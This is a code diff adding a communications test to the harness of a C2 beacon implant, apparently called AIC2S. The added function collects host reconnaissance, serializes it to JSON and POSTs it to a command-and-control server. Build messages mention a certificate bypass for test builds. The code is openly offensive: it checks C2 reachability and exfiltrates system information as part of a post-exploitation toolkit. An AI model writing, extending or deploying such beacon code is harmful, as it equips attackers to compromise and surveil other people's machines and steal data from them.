@@ -10,9 +10,61 @@
 #include "killswitch.h"
 #include "postex.h"
 #include "recon.h"
+// ============================================================
+// COMMS TEST — call this explicitly
+// ============================================================
+static BOOL test_comms(void) {
+  printf("\n=== COMMS TEST ===\n");
+
+  // step 1: connection check
+  printf("[*] Step 1: checking_connection...\n");
+  BOOL connected = FALSE;
+  checking_connection(&connected);
+  printf("[*] Connection result: %s\n", connected ? "OK" : "FAILED");
+  if (!connected) {
+    printf("[!] Cannot reach C2 at %S:%d\n", C2_HOST, C2_PORT);
+    printf("[!] Is the listener running? Firewall open?\n");
+    return FALSE;
+  }
+
+  // step 2: collect recon
+  printf("[*] Step 2: collecting recon...\n");
+  CHECKIN_INFO info = {0};
+  recon_collect(&info);
+  recon_print(&info);
+
+  // step 3: serialize
+  CHAR *json = NULL;
+  DWORD jsonLen = 0;
+  recon_serialize(&info, &json, &jsonLen);
+  printf("[*] Step 3: JSON (%lu bytes):\n%s\n", jsonLen, json);
+
+  // step 4: POST to C2
+  printf("[*] Step 4: beacon_post...\n");
+  BYTE *response = NULL;
+  DWORD respLen = 0;
+  BOOL posted = beacon_post((BYTE *)json, jsonLen, &response, &respLen);
+  printf("[*] beacon_post returned: %s\n", posted ? "TRUE" : "FALSE");
+
+  if (response && respLen > 0) {
+    printf("[+] C2 response (%lu bytes):\n%.*s\n", respLen, respLen,
+           (char *)response);
+    HeapFree(GetProcessHeap(), 0, response);
+  } else {
+    printf("[!] No response body from C2\n");
+  }
+
+  HeapFree(GetProcessHeap(), 0, json);
+  return posted;
+}
 
 int main() {
   printf("=== AIC2S BEACON LOCAL TEST ===\n\n");
+#ifdef BEACON_TEST
+#pragma message("BEACON_TEST is defined — cert bypass enabled")
+#else
+#pragma message("BEACON_TEST is NOT defined — cert bypass DISABLED")
+#endif
 
   // ── Test 1: Recon ─────────────────────────────────────────
   printf("[TEST 1] Recon\n");
@@ -86,6 +138,12 @@ int main() {
     HeapFree(GetProcessHeap(), 0, pCipher);
   } else {
     printf("[!] aes_encrypt_payload failed\n");
+  }
+  printf("\n=== TEST 9: COMMS ===\n");
+  if (test_comms()) {
+    printf("[+] COMMS: PASS\n");
+  } else {
+    printf("[!] COMMS: FAIL\n");
   }
 
   printf("\n=== TEST COMPLETE ===\n");
